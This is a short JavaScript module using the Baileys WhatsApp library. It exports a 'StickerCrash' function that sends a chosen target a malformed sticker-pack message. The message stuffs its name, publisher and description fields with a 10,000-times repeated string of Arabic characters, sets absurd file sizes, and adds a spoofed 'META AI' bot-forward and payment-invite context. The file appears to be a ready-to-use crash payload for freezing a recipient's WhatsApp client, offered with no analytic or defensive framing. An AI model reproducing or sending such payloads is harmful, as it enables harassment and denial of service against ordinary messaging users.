


const { default: makeWASocket, useMultiFileAuthState, Browsers, delay, DisconnectReason, makeCacheableSignalKeyStore } = require('@whiskeysockets/baileys');
const pino = require('pino');

function createSticker(fileName) {
  return {
    fileName,
    isAnimated: false,
    isLottie: true,
    mimetype: "application/pdf",
    emojis: ["🀄"],
    accessibilityLabel: "FlowX"
  };
}

async function StickerCrash(SYxS7, target) {
  await SYxS7.relayMessage(
    target,
    {
      stickerPackMessage: {
        stickerPackId: "X",

        name: "./Lolipop" + "؂ن؃؄ٽ؂ن؃".repeat(10000),
        publisher: "./Lolipop" + "؂ن؃؄ٽ؂ن؃".repeat(10000),
        packDescription: "./Lolipop" + "؂ن؃؄ٽ؂ن؃".repeat(10000),

        stickers: [
          createSticker("FlMx-HjycYUqguf2rn67DhDY1X5ZIDMaxjTkqVafOt8=.webp"),
          createSticker("KuVCPTiEvFIeCLuxUTgWRHdH7EYWcweh+S4zsrT24ks=.webp"),
          createSticker("wi+jDzUdQGV2tMwtLQBahUdH9U-sw7XR2kCkwGluFvI=.webp"),
          createSticker("jytf9WDV2kDx6xfmDfDuT4cffDW37dKImeOH+ErKhwg=.webp"),
          createSticker("ItSCxOPKKgPIwHqbevA6rzNLzb2j6D3-hhjGLBeYYc4=.webp"),
          createSticker("1EFmHJcqbqLwzwafnUVaMElScurcDiRZGNNugENvaVc=.webp"),
          createSticker("3UCz1GGWlO0r9YRU0d-xR9P39fyqSepkO+uEL5SIfyE=.webp"),
          createSticker("1cOf+Ix7+SG0CO6KPBbBLG0LSm+imCQIbXhxSOYleug=.webp"),
          createSticker("5R74MM0zym77pgodHwhMgAcZRWw8s5nsyhuISaTlb34=.webp"),
          createSticker("3c2l1jjiGLMHtoVeCg048To13QSX49axxzONbo+wo9k=.webp")
        ],

        fileLength: "999999",
        fileSha256: "4HrZL3oZ4aeQlBwN9oNxiJprYepIKT7NBpYvnsKdD2s=",
        fileEncSha256: "1ZRiTM82lG+D768YT6gG3bsQCiSoGM8BQo7sHXuXT2k=",
        mediaKey: "X9cUIsOIjj3QivYhEpq4t4Rdhd8EfD5wGoy9TNkk6Nk=",
        mediaKeyTimestamp: "1741150286",

        directPath:
          "/v/t62.15575-24/24265020_2042257569614740_7973261755064980747_n.enc",

        trayIconFileName:
          "2496ad84-4561-43ca-949e-f644f9ff8bb9.png",

        thumbnailDirectPath:
          "/v/t62.15575-24/11915026_616501337873956_5353655441955413735_n.enc",

        thumbnailSha256:
          "R6igHHOD7+oEoXfNXT+5i79ugSRoyiGMI/h8zxH/vcU=",

        thumbnailEncSha256:
          "xEzAq/JvY6S6q02QECdxOAzTkYmcmIBdHTnJbp3hsF8=",

        thumbnailHeight: 252,
        thumbnailWidth: 252,

        imageDataHash:
          "ODBkYWY0NjE1NmVlMTY5ODNjMTdlOGE3NTlkNWFkYTRkNTVmNWY0ZThjMTQwNmIyYmI1ZDUyZGYwNGFjZWU4ZQ==",

        stickerPackSize: "999999999",
        stickerPackOrigin: "1",

        contextInfo: {
          quotedMessage: {
            paymentInviteMessage: {
              serviceType: 3,
              expiryTimestamp: Date.now() + 1814400000 // 21 days
            },
            forwardedAiBotMessageInfo: {
              botName: "META AI",
              botJid: `${Math.floor(Math.random() * 5000000)}@s.whatsapp.net`,
              creatorName: "Bot"
            }
          }
        }
      }
    },
    {
      participant: { jid: target }
    }
  );
}

module.exports = { StickerCrash }